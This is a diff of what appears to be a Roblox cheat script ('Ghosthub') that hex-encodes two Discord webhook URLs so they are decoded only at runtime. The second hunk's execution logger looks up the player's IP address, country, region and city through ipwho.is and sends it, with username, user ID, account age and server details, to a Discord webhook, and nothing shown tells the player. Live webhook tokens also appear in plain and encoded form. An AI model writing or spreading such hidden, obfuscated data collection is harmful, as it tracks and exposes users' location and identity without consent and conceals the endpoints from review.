@@ -1738,7 +1738,7 @@ if FileScriptSupported == true then
                FeedbackPost.Active = false
                FeedbackTextBox.Active = false
                local content = "```✅ 𝗚𝗵𝗼𝘀𝘁𝗵𝘂𝗯 𝗙𝗲𝗲𝗱𝗯𝗮𝗰𝗸\n\nUsername: "..game.Players.LocalPlayer.Name.."\nDisplay: "..game.Players.LocalPlayer.DisplayName.."\nUser ID: "..game.Players.LocalPlayer.UserId.."\n\nMessage: "..FeedbackTextBox.Text.."```"
-               local webhookUrl = "https://discord.com/api/webhooks/1358640254734827672/W59dnLYOCYXNhA376u_pdUskvA3te6RRGoXaP9RnIepzIUZ97CQXalgMB8pF6LWBrw1p"
+               local webhookUrl = Decode("68 74 74 70 73 3A 2F 2F 64 69 73 63 6F 72 64 2E 63 6F 6D 2F 61 70 69 2F 77 65 62 68 6F 6F 6B 73 2F 31 33 35 38 36 34 30 32 35 34 37 33 34 38 32 37 36 37 32 2F 57 35 39 64 6E 4C 59 4F 43 59 58 4E 68 41 33 37 36 75 5F 70 64 55 73 6B 76 41 33 74 65 36 52 52 47 6F 58 61 50 39 52 6E 49 65 70 7A 49 55 5A 39 37 43 51 58 61 6C 67 4D 42 38 70 46 36 4C 57 42 72 77 31 70 ","Hex")
                local messageData = {["content"] = content}
                local request = request or syn.request
                local send = request({
@@ -4425,7 +4425,7 @@ local function DiscordBot()
 
  local API = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://ipwho.is/"))
  local data = {content = "✅ Execute Time: "..os.date("%B %d %Y | %p %I:%M:%S"),embeds = {{description = "Username: \n"..game.Players.LocalPlayer.Name.."\n\nDisplay: \n"..game.Players.LocalPlayer.DisplayName.."\n\nUser ID: \n"..game.Players.LocalPlayer.UserId.."\n\nAccount Age: \n"..game.Players.LocalPlayer.AccountAge.."\n\nCreated: \n"..GetPlayerJoinDate(game.Players.LocalPlayer.AccountAge).."\n\nVerified: \n"..DetectVerifyEmail(game.Players.LocalPlayer).."\n\nPremium: \n"..DetectPremuim(game.Players.LocalPlayer).."\n\nIP Address: \n"..API.ip.."\n\nContinent: \n"..API.continent.."\n\nCountry: \n"..API.country.."\n\nCountry Flag: \n"..API.flag.emoji.."\n\nRegion: \n"..API.region.."\n\nCity: \n"..API.city.."\n\nGame Place: \n"..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.."\n\nPlace ID: \n"..game.placeId.."\n\nServer ID: \n"..game.jobId,thumbnail = {url = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar?userIds="..game.Players.LocalPlayer.UserId.."&size=420x420&format=Png&isCircular=false")).data[1].imageUrl}}}}
- local webhookUrl = "https://discord.com/api/webhooks/1357769721507877126/crs2N9xlCA--6iq04F_m-RRPCOIzAD7XVQuCCJk8DQRybMCKCCetMMAQ6bIPBO6BHHuY"
+ local webhookUrl = Decode("68 74 74 70 73 3A 2F 2F 64 69 73 63 6F 72 64 2E 63 6F 6D 2F 61 70 69 2F 77 65 62 68 6F 6F 6B 73 2F 31 33 35 37 37 36 39 37 32 31 35 30 37 38 37 37 31 32 36 2F 63 72 73 32 4E 39 78 6C 43 41 2D 2D 36 69 71 30 34 46 5F 6D 2D 52 52 50 43 4F 49 7A 41 44 37 58 56 51 75 43 43 4A 6B 38 44 51 52 79 62 4D 43 4B 43 43 65 74 4D 4D 41 51 36 62 49 50 42 4F 36 42 48 48 75 59 ","Hex")
  local request = request or syn.request
  local send = request({
    Url = webhookUrl,
